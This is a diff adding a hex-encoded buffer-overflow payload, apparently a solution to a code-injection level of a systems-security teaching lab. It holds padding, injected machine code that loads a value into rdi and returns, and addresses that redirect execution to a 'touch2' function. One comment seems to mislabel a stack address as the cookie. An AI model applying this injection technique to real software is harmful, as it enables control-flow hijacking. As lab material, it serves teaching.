@@ -1,0 +1,5 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+48 c7 c7 b7 10 a5 1e c3 /* Assembly code moves address of cookie to rdi */
+08 44 67 55 00 00 00 00 /* cookie */
+fc 5a 55 55 55 55 00 00 /* Touch2 address */
